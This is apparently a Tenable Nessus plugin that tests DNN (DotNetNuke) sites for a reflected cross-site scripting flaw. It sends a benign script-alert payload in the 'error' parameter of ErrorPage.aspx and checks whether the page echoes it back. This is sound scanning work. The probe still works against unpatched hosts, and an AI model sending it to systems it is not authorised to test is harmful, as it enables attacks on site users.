#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(38928);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2015/10/20 19:40:17 $");

  script_bugtraq_id(35074);
  script_osvdb_id(54739);
  script_xref(name:"Secunia", value:"35178");
  script_xref(name:"EDB-ID", value:"33009");

  script_name(english:"DNN (DotNetNuke) ErrorPage.aspx XSS");
  script_summary(english:"Attempts a non-persistent XSS attack.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP.NET application that is affected
by a cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of DNN installed on the remote host is affected by a
cross-site scripting vulnerability due to a failure to properly
sanitize user-supplied input to the 'error' parameter of the
ErrorPage.aspx' script before using it to generate dynamic HTML
output. An attacker can exploit this, via a crafted URL, to execute
arbitrary script code in a user's browser session.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/503723/30/0/threaded");
  # http://www.dotnetnuke.com/News/SecurityPolicy/securitybulletinno27/tabid/1276/Default.aspx
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2acfaec7");
  script_set_attribute(attribute:"see_also", value:"http://www.dnnsoftware.com/platform/manage/security-center");
  script_set_attribute(attribute:"solution", value:"Upgrade to DNN version 4.9.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/05/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/05/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/05/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dotnetnuke:dotnetnuke");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("dotnetnuke_detect.nasl");
  script_require_keys("installed_sw/DNN");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "DNN";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, asp:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

exploit = '<script>alert("'+SCRIPT_NAME -".nasl"+"-"+unixtime()+ '")</script>';

exploited = test_cgi_xss(
  port:port,
  dirs:make_list(dir),
  cgi:"/ErrorPage.aspx?",
  qs:"status=500&error="+urlencode(str:exploit),
  pass_str:'<p>'+exploit+'</p>',
  ctrl_re:'DotNetNuke Error'
);

if (!exploited)
{
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
}
